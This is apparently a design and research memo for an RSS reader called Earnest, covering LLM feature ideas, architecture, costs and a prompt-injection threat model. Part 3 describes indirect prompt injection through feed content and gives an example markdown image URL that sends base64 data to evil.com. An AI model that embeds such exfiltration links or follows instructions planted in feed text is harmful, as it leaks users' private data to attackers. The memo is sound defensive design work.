# Earnest — LLM integration research

Date: 2026-11-01. Prices verified on vendor pricing pages (the vendors' own rate cards) unless marked [unverified].

## Part 1 — Ideas

Cost: **free/local** (self-hosted/on-device), **cheap** (nano/flash API, <$20/mo at 3000 items/day), **mid** ($20–100/mo). Risk L/M/H.

| # | Idea | Value | Cost | Risk | Local/on-device | Verdict |
|---|------|-------|------|------|----------------|---------|
| 1 | Cluster same story across outlets (embeddings + simhash), "also covered by N sources" | Kills multi-outlet noise | cheap | L | yes (bge-m3/nomic via Ollama) | keeper |
| 2 | Exact-dupe dedupe (canonical-text SHA-256) + fuzzy (simhash) | No LLM needed | free/local | L | yes | keeper |
| 3 | Learned importance ranking from read/skip/star | Makes 1000 feeds survivable | free/local | M (feedback loops) | yes | keeper |
| 4 | Per-feed digest modes: instant/headlines/daily/weekly/archive | Volume control per source | cheap | L | partial | keeper |
| 5 | "Mute this topic for N days" trend suppression | One story can't flood inbox for a week | free/local | L | yes | keeper |
| 6 | Auto-archive predicted low-priority (recoverable) | Near-zero inbox | cheap | M (hides things) | partial | keeper |
| 7 | Multi-length TL;DR (1 line / 3 bullets / paragraph) | Read in 5s or 30s | cheap–mid | M (hallucination) | partial (3B on-device for 1-liner) | keeper |
| 8 | "What's new since I last read about this" delta on clusters | Catch up on evolving stories | mid | M | no | keeper |
| 9 | Translate items to your language | Read foreign sources | free/local (Hy-MT1.5-1.8B, OPUS-MT) or cheap | L | yes (quantized MT on CPU/phone) | keeper |
| 10 | Inline jargon/entity explainer | Lower barrier on technical feeds | cheap | L | partial | keeper |
| 11 | Entity extraction + entity pages linking items over time | See connections | cheap | M | partial | keeper |
| 12 | Label news vs opinion vs press release; "developing story" flag | Context for what you read | cheap | L | partial | keeper |
| 13 | Semantic search over archive (pgvector) | Find "that article from March" | cheap | L | yes | keeper |
| 14 | Ask-my-feeds RAG chat, mandatory citations (item ID + quoted span) | Research assistant over your reading | mid | M (hallucination, injection) | no (or local 8–14B) | keeper |
| 15 | "More like this" per item | Discovery | free/local | L | yes | keeper |
| 16 | NL filters ("unread Rust items, last 2 weeks") | Search without syntax | cheap | L | no | keeper |
| 17 | NL triage rules → auto tag/archive/star | Inbox autopilot | cheap | H if rules can act (injection) | no | keeper, behind confirmation tiers |
| 18 | Watch rules: notify on entities/keywords, quiet hours + daily cap | Early warning on topics | cheap | M (spam) | no | keeper |
| 19 | Auto-save important items to Karakeep via scoped API key | Read-later pipeline | free (Karakeep API) | M (external write) | n/a | keeper |
| 20 | Weekly briefing (email/push) with summaries | Monday catch-up | mid | L | no | keeper |
| 21 | Audio briefing: TTS weekly digest as a private podcast feed | Commute listening | cheap (Kokoro local or cloud TTS) | L | yes (Kokoro-82M) | keeper |
| 22 | Feed discovery from Karakeep history / reading graph / OPML of similar readers | Find new sources | cheap | L | no | keeper |
| 23 | Dead-feed detection + prune suggestions | Hygiene | free/local | L | yes | keeper |
| 24 | Never-read feed detection (engagement stats) → mute/unsub suggestions | Cut subscription bloat | free/local | L | yes | keeper |
| 25 | Generate feeds for sites without one (RSS-Bridge / fivefilters / LLM extraction) | Read anything | free/local classic, cheap LLM | M (scraping ToS) | partial | keeper |
| 26 | Full-text expansion of partial feeds | Read in-app | free/local | M (licensing) | yes | keeper |
| 27 | MCP server: external agents list/search/ask/star/archive Earnest | Earnest as a tool for LLMs | free (server-side) | H (Part 3) | n/a | keeper |
| 28 | REST API v1, scoped API keys + rate limits (Karakeep-style) | Any client integrates | free | M | n/a | keeper |
| 29 | Webhooks/push on new high-priority items | Real-time agent triggers | free | M (spam/loops) | n/a | keeper |

### Top 10 (ranked)

1. **Clustering + dedupe** (#1+#2) — biggest quality-of-life win, mostly local.
2. **Ask-my-feeds with citations** (#14) — the differentiator; citations make it trustworthy.
3. **Multi-length summaries** (#7) — table stakes in 2026.
4. **Per-feed digest modes + auto-archive** (#4+#6) — volume control without missing things.
5. **Learned importance ranking** (#3).
6. **NL triage rules** (#17) — high value, highest risk; ship behind confirmation tiers.
7. **"What's new since last read" deltas** (#8) — unique to a reader with memory.
8. **Semantic search** (#13) — nearly free with local embeddings.
9. **Watch rules with rate limits** (#18).
10. **MCP + scoped REST for external agents** (#27/#28) — makes Earnest a platform.

Deferred: audio briefings (#21), Karakeep auto-save (#19, ship after #17's safety model), LLM feed generation (#25 — classic extractors first).

## Part 2 — Architecture

### Direction A: Earnest calling LLMs

One provider abstraction in the Rust backend, pluggable backends:

| Backend | How | Notes |
|---|---|---|
| BYOK / OpenAI-compatible | single `base_url` + `api_key`; covers any `/v1` endpoint | Ollama exposes OpenAI-compatible `/v1` at `http://localhost:11434/v1` plus Anthropic-compatible `/v1/messages` (https://docs.ollama.com/api/introduction); llama.cpp `llama-server` likewise (https://github.com/ggml-org/llama.cpp/blob/master/tools/server/README.md) |
| Local: Ollama / llama.cpp | Docker Compose service on the NAS | Ollama v0.40.x current (https://github.com/ollama/ollama/releases); llama.cpp builds daily (b12032, 2026-11-01); both do embeddings, rerank, even TTS |
| Apple on-device | Foundation Models framework `SystemLanguageModel` (~3B, free, offline) on iOS/iPadOS/macOS 26+; Private Cloud Compute for heavier work; 2026 additions: vision, `LanguageModel` protocol for cloud models, Evaluations framework (https://developer.apple.com/documentation/foundationmodels/systemlanguagemodel, https://developer.apple.com/videos/play/wwdc2026/241/) | Apple Intelligence device + region required; on-device model changes per OS version, so prompt versioning matters |
| Android on-device | ML Kit GenAI Prompt API over AICore/Gemini Nano (nano-v3 Pixel 9/10, nano-v4 Pixel 11, plus OEM flagships); structured output + prefix caching rolling out (https://developer.android.com/ai/gemini-nano, https://developers.google.com/ml-kit/genai) | Flagship-only, quota-limited; LiteRT-LM for custom small models |

Server-side pipeline is the default (NAS runs Ollama/llama.cpp). On-device models only for private, low-stakes features (1-line summaries, triage hints, search) — never for anything whose output triggers external actions.

### Direction B: external agents calling Earnest

Expose both a REST API v1 (granular scoped API keys — Karakeep added exactly this in 2026, commit d95e6f8 in https://github.com/karakeep-app/karakeep) and an MCP server over Streamable HTTP. MCP spec revision **2026-07-28** is current: stateless, `server/discover`, MRTR instead of server-initiated sampling, OAuth 2.1 with RFC 8707 audience binding, token passthrough forbidden (https://modelcontextprotocol.io/specification/2026-07-28 and .../basic/authorization). Tools read-mostly (`list_unread`, `search`, `get_item`, `get_summary`, `ask_feeds`); write tools (`star`, `archive`, `save_to_karakeep`) behind per-scope consent.

### Recommended pipeline

1. **Fetch → canonicalize → sanitize** (HTML→text, cap ~8k tokens; keep raw separately).
2. **Dedupe**: SHA-256 of canonical text + simhash — no LLM cost.
3. **Embed once**, store in pgvector: local `bge-m3` (1.2 GB, 1024-dim, multilingual, via Ollama `/api/embed`, https://ollama.com/library/bge-m3) or `nomic-embed-text`; cloud fallback `text-embedding-3-small` at **$0.02/1M tokens** (https://developers.openai.com/api/docs/pricing). Cluster embeddings for idea #1.
4. **Lazy summaries by default**: on first open, plus a nightly **Batch API** job (50% off, 24h turnaround — https://developers.openai.com/api/docs/guides/batch) for digests and "what's new" deltas. Never eager-summarize everything.
5. **Cache keyed by `(content_hash, prompt_version, model, params)`** in Postgres — summaries, embeddings, clusters are content-addressed and idempotent.
6. **Tiering**: nano/luna/haiku-class for classification and importance (gpt-5.6-luna $0.10/$0.50, claude-haiku-5.5 $0.10/$0.50, gemini-3.5-flash-lite $0.30/$2.50 per 1M — pricing pages below); flash/sonnet-class for summaries, deltas, RAG (gemini-3.8-flash $0.75/$3.75 promo through 2026-12-31; claude-sonnet-5.5 $2/$10; gpt-5.4-mini $0.75/$4.50). Batch is 50% off on OpenAI, Anthropic, Google.
7. **Prompt versioning**: prompts in DB with a version string in every cache key and log line; A/B via evals.
8. **Summary evaluation**: LLM-as-judge on a held-out set (faithfulness, citation accuracy) plus human spot-checks; block release on regression. Apple's Evaluations framework is the on-device equivalent.

### Monthly cost — 1000 feeds, ~3000 new items/day

Assumptions: 1200 in + 200 out tokens/item; 30 days.

| Component | Tokens/day | Model & price/1M | $/day | $/mo |
|---|---|---|---|---|
| Embeddings (cloud) | 3.6M in | text-embedding-3-small $0.02 | $0.07 | ~$2 |
| Embeddings (local bge-m3) | — | free | $0 | $0 |
| Summaries, batch | 3.6M in + 0.6M out | gpt-5.6-luna batch $0.05/$0.25 | $0.33 | ~$10 |
| Summaries alt, batch | same | gemini-3.8-flash batch $0.375/$1.875 promo (then $0.75/$3.75 from 2027) | $2.48 | ~$74 promo |
| Triage/classify (nano-tier, ~30% extra) | ~1.1M in + 0.2M out | haiku-5.5 batch $0.05/$0.25 | $0.11 | ~$3 |
| Ask-my-feeds (~20 queries/day, 8k in, 400 out) | 0.16M in + 0.008M out | sonnet-5.5 $2/$10 | $0.40 | ~$12 |
| **Total cloud small-tier** | | | | **~$27/mo** |
| **Total local (Ollama/llama.cpp)** | | | | **~$0 + NAS electricity** |

Sources: https://developers.openai.com/api/docs/pricing, https://platform.claude.com/docs/en/about-claude/pricing, https://ai.google.dev/gemini-api/docs/pricing. Prices change often; re-check at build time. Gemini's free tier trains on your data — use paid tier for private reading (per Google's own page).

## Part 3 — Safety: feed content is attacker-controlled

Anyone who can publish to a subscribed feed controls text/images an Earnest LLM will read. Current research says this is real and unsolved: context-aware indirect prompt injection (IPI) succeeds at **71.7–100%** against modern web agents, and only layered defenses brought it to 1.7% (AgentBreaker, ACM Proc. Softw. Eng. 2026, https://dl.acm.org/doi/10.1145/3832165); adaptive frameworks keep finding new attacks (MUZZLE, https://arxiv.org/html/2602.09222v2).

Key concepts:

- **IPI**: instructions embedded in retrieved content are followed as if user-issued (survey: https://arxiv.org/html/2603.01564v1).
- **The lethal trifecta** (https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/): private data + untrusted content + an exfiltration channel. Together they let an attacker steal data; removing any one leg defeats the class. In security, "99% blocked is a failing grade" (https://simonwillison.net/2025/Sep/26/how-to-stop-ais-lethal-trifecta/).
- **Markdown/URL exfiltration**: `![img](https://evil.com/?d=<base64>)` leaks data when rendered (https://simonwillison.net/2025/Aug/9/bay-area-ai/).
- **Design patterns** (IBM/Invariant/ETH/Google/Microsoft, via https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/): once untrusted input enters context, the output is tainted — so tainted output must not be able to trigger consequential actions.

| Attack on Earnest | Defence |
|---|---|
| IPI hijacks summarizer/triage into bad labels, spam notifications, Karakeep writes | **Capability scoping**: summarizer/classifier get zero tools. Only a separate user-initiated agent has tools, with **confirmation tiers**: tier 0 auto (read/search/tag), tier 1 notify, tier 2 confirm-in-UI (star/archive/Karakeep write/webhook), tier 3 never-auto (delete/send). Tainted output can only cause tier-0/1 actions |
| Exfiltration via URLs/images in summaries or rendered HTML | Summaries rendered as sanitized text; never auto-load remote images; URLs in LLM output inert unless user-clicked; fetch-layer egress allowlist (registered feed + linked article URLs only, per-domain rate limits, no arbitrary redirects); strip query-string URLs from generated links |
| Tool/feed output treated as trusted instructions | Wrap all feed-derived text in `[UNTRUSTED CONTENT]` delimiters; system prompt says untrusted content is data, never instructions; repeat the boundary at the prompt end (attacker content lands last) |
| Notification spam via injected watch rules | Hard caps (≤5/day/rule), quiet hours, global kill switch; rule changes require UI confirmation, never originate from feed content |
| Hallucinated summaries | Mandatory citations (item ID + quoted source span); source excerpt on tap; "unverified" badge when citation check fails; faithfulness eval suite gates releases |
| Ranking manipulation (SEO farms flooding embeddings/clusters) | Hybrid retrieval (BM25 + vector); per-cluster provenance ("N sources"); importance blends your read history, not just model score; dedupe on canonical text collapses copy-paste farms |
| Filter bubbles from personalization | "Least-personalized / source-diverse" view toggle; log model+prompt version behind every ranking decision |
| MCP/REST abuse (stolen key, confused deputy) | Scoped API keys (read vs write, Karakeep model); OAuth 2.1 + RFC 8707 audience validation; no token passthrough; short-lived tokens; TLS only; validate `Origin`/`Host`; bind local servers to localhost; per-tool consent for consequential calls (MCP 2026-07-28 authorization, https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization; OWASP MCP cheat sheet, https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html) |
| Injection spreading via summaries consumed by other agents | Exports via MCP/REST prepend the untrusted-data warning so downstream agents treat the summary as data too |

Principle: any prompt that ingested feed text is fully attacker-controlled; tainted context must never reach consequential tools without a human in the loop.

## Gaps

- GitHub API was rate-limited for pgvector stats — version/stars [unverified]; its role as the standard Postgres vector extension is well established but not re-verified today.
- Karakeep MCP servers on GitHub are small/unofficial (e.g. pen2000/karakeep-mcp-server); use Karakeep's REST OpenAPI (`/api/v1`, verified in repo source https://github.com/karakeep-app/karakeep/blob/main/packages/open-api/index.ts).
- Cloud TTS pricing not fetched; local Kokoro assumed free [unverified].
- Competitor LLM features (Feedly/Inoreader/Miniflux) not compared — useful before finalizing Part 1 rankings.
- Apple PCC eligibility and Android AICore quotas are device/region-dependent; APIs verified, exact quotas not.
- Ollama cloud plan pricing and Gemini free-tier data-use terms come from vendor pages (vendor marketing) — treat with care.
- Kagi API pricing not checked.
